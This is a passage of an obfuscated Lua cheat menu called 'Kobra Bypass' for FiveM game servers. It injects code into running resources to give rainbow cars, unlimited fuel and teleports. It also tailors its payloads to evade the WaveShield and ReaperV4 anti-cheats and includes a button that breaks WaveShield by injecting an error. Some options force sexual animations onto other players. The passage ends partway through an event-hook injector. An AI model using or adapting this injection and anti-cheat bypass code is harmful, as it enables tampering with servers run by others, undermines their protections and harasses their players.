                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end break;end end else v12:Notify("error","Kobra","Rainbow Vehicle Off",8310 -5310 );if (GetResourceState("WaveShield")=="started") then print("swave");v48(v465,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);else v48(v465,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end end break;end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v466) if v466 then local v605=279 -(174 + 105) ;while true do if (v605==0) then v12:Notify("success","Kobra","Unlimited Fuel On",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);break;end end else local v606=0;while true do if (v606==0) then v12:Notify("error","Kobra","Unlimited Fuel Off",10079 -7079 );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() local v467=0;while true do if (0==v467) then print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]]);break;end end end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v468=0;local v469;while true do if (v468==(1 + 1)) then v281:Notify("success","Kobra","Attempted to twerk on "   ..  #v469   .. " player(s)." ,14369 -10369 );break;end if (v468==(1887 -(1819 + 67))) then if ( #v469==0) then local v867=0 + 0 ;while true do if ((0 + 0)==v867) then v281:Notify("error","Kobra","You must select a player first!",4357 -(259 + 1098) );return;end end end for v806,v807 in ipairs(v469) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v807,v807));end v468=2 + 0 ;end if (v468==0) then v469={};for v808,v809 in pairs(v27) do if v809 then v469[ #v469 + 1 + 0 ]=v808;end end v468=1 + 0 ;end end end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v470=0 + 0 ;local v471;while true do if ((9 -7)==v470) then v281:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v471   .. " player(s)." ,5706 -(667 + 1039) );break;end if (1==v470) then if ( #v471==0) then local v868=1019 -(274 + 745) ;while true do if (v868==0) then v281:Notify("error","Kobra","You must select a player first!",2267 + 733 );return;end end end for v810,v811 in ipairs(v471) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v811,v811));end v470=2;end if (v470==0) then v471={};for v812,v813 in pairs(v27) do if v813 then v471[ #v471 + 1 ]=v812;end end v470=1 + 0 ;end end end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v472=1306 -(301 + 1005) ;local v473;local v474;while true do if (v472==(0 + 0)) then v473=GetResourceState("WaveShield")=="started" ;v474=GetResourceState("ReaperV4")=="started" ;v472=1;end if ((2 -1)==v472) then if v473 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v474 then MachoInjectThread(0,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end break;end end end},{type="button",label="Mission Row PD",onSelect=function() local v475=0 + 0 ;local v476;local v477;while true do if (v475==1) then if v476 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v477 then MachoInjectThread(0,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end break;end if (v475==0) then v476=GetResourceState("WaveShield")=="started" ;v477=GetResourceState("ReaperV4")=="started" ;v475=1 + 0 ;end end end},{type="button",label="Pillbox Hospital",onSelect=function() local v478=GetResourceState("WaveShield")=="started" ;local v479=GetResourceState("ReaperV4")=="started" ;if v478 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v479 then MachoInjectThread(0 -0 ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end end},{type="button",label="Grove Street",onSelect=function() local v480=GetResourceState("WaveShield")=="started" ;local v481=GetResourceState("ReaperV4")=="started" ;if v480 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v481 then MachoInjectThread(445 -(92 + 353) ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end end},{type="button",label="Legion Square",onSelect=function() local v482=0;local v483;local v484;while true do if (v482==(1 + 0)) then if v483 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v484 then MachoInjectThread(0 -0 ,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end break;end if (v482==(0 -0)) then v483=GetResourceState("WaveShield")=="started" ;v484=GetResourceState("ReaperV4")=="started" ;v482=2 -1 ;end end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v59("Choose Menu Key","",function(v561) for v607,v608 in pairs(v44) do if (v608:lower()==v561:lower()) then local v814=0 -0 ;while true do if (v814==(0 + 0)) then v23=v608;Wait(497 -247 );v814=266 -(34 + 231) ;end if (1==v814) then v12:ShowUI();return;end end end end end,"keybind");end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1318 -(930 + 387) ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=2 -1 ,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=2 -1 ;v15=2 -1 ;end;local function v96(v282) for v485,v486 in ipairs(v16) do if (v486.label=="Server") then for v723,v724 in ipairs(v486.categories) do if (v724.label=="Triggers") then local v869=0;while true do if (v869==(0 + 0)) then v724.tabs[ #v724.tabs + (323 -(125 + 197)) ]=v282;return;end end end end end end end v12.UpdateTabChecked=function(v283,v284,v285,v286) for v487,v488 in pairs(v284 or {} ) do if ((v488.label==v285) and ((v488.type=="checkbox") or (v488.type=="slider-checkbox") or v488.type:find("checkbox"))) then v488.checked=v286;elseif (v488.type=="subMenu") then if v488.categories then for v985,v986 in pairs(v488.categories) do v283:UpdateTabChecked(v986.tabs,v285,v286);end end if v488.subTabs then v283:UpdateTabChecked(v488.subTabs,v285,v286);end end end end;v12.ShowKeybindList=function(v287,v288) v287:SendMessage({action="displayBinds",visible=true,binds=v288});end;v12.HideKeybindList=function(v289) v289:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v290,v291,v292,v293) local v294=0;local v295;local v296;local v297;while true do if (v294==1) then v292=v292 or (1347 -(339 + 658)) ;if ( not v296 or  not DoesEntityExist(v296) or  not IsPlayerPlaying(PlayerId())) then local v815=0 -0 ;while true do if (v815==0) then v295={};return v295;end end end v294=3 -1 ;end if (v294==2) then v297=GetActivePlayers();if v297 then for v870,v871 in ipairs(v297) do if (v293 or (v871~=PlayerId())) then local v987=0;local v988;while true do if (v987==0) then v988=GetPlayerPed(v871);if (v988 and DoesEntityExist(v988) and IsEntityAPed(v988) and  not IsEntityDead(v988)) then local v1341=1348 -(743 + 605) ;local v1342;while true do if (v1341==0) then v1342=GetEntityCoords(v988);if v1342 then local v1518=0 + 0 ;local v1519;while true do if (v1518==0) then v1519= #(v291-v1342);if (v1519<=v292) then v295[ #v295 + 1 + 0 ]={name=GetPlayerName(v871),serverId=GetPlayerServerId(v871)};end break;end end end break;end end end break;end end end end else local v816=0;local v817;local v818;local v819;while true do if (0==v816) then v817,v818=FindFirstPed();v819=nil;v816=3 -2 ;end if (v816==(2 -1)) then repeat local v1039=0;while true do if (v1039==(0 + 0)) then if (v818 and IsPedAPlayer(v818) and DoesEntityExist(v818)) then local v1389=NetworkGetPlayerIndexFromPed(v818);if ((v1389~= -1) and (v293 or (v1389~=PlayerId()))) then local v1437=GetEntityCoords(v818);if v1437 then local v1520= #(v291-v1437);if (v1520<=v292) then v295[ #v295 + (250 -(197 + 52)) ]={name=GetPlayerName(v1389),serverId=GetPlayerServerId(v1389)};end end end end v819,v818=FindNextPed(v817);break;end end until  not v819 EndFindPed(v817);break;end end end v294=6 -3 ;end if (v294==(6 -3)) then if ( #v295==(0 + 0)) then v295={};end return v295;end if (0==v294) then v295={};v296=PlayerPedId();v294=1 + 0 ;end end end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(1783 -783 );v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",10099 -7099 );Wait(2281 -1281 );v12:Notify("info","Kobra","Hello Kobra Menu user, thanks for using Kobra Bypass!",3000);Wait(388 + 612 );v96({type="button",label="Bypass WaveShield [Risky]",onSelect=function() local v489=0 -0 ;while true do if (v489==1) then v12:Notify("success","Kobra","WaveShield bypass attempted.",4097 -(97 + 1000) );break;end if (v489==(0 -0)) then if (GetResourceState("WaveShield")~="started") then v12:Notify("info","Kobra","WaveShield not detected.",4845 -(143 + 1702) );return;end for v820=1,3 -1  do MachoInjectResource2(372 -(40 + 329) ,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v489=1 + 0 ;end end end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v96({type="button",label="DeFXAP Events",onSelect=function() local v610=0 + 0 ;local v611;local v612;local v613;while true do if (v610==(0 -0)) then v12:HideUI();v611=nil;v612=false;v610=1 + 0 ;end if (v610==3) then MachoMenuNotification("Injector","Hooks injected into ^3"   .. v611   .. "^7 successfully!" );v12:ShowUI();break;end if ((67 -(9 + 56))==v610) then if (GetResourceState(v611)~="started") then local v989=0;while true do if (v989==(585 -(531 + 53))) then return;end if (v989==0) then MachoMenuNotification("Error","Resource ^3"   .. v611   .. "^7 is not started or doesn’t exist." );v12:ShowUI();v989=1 + 0 ;end end end v613=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
